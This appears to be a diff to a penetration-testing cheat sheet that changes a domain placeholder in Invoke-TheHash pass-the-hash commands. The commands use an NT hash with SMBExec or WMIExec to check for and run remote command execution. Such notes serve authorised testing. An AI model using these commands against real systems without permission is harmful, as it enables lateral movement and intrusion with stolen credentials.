@@ -19,11 +19,11 @@ Invoke-TheHash -Type SMBExec -Target '<ip_range>'
 ## Check for command execution (pth)
 SMBClient, SMBEnum, SMBExec, or WMIExec
 ```
-Invoke-TheHash -Type <method|SMBExec> -Domain <domain> -Username <user> -Hash <nt_hash> -Target <ip>
+Invoke-TheHash -Type <method|SMBExec> -Domain <domain_fqdn> -Username <user> -Hash <nt_hash> -Target <ip>
 ```
 
 ## execute command (pth) 
 SMBClient, SMBEnum, SMBExec, or WMIExec
 ```
-Invoke-TheHash -Type <method|SMBExec> -Domain <domain> -Username <user> -Hash <nt_hash> -Command "<command|whoami>" -Target <ip>
+Invoke-TheHash -Type <method|SMBExec> -Domain <domain_fqdn> -Username <user> -Hash <nt_hash> -Command "<command|whoami>" -Target <ip>
 ```
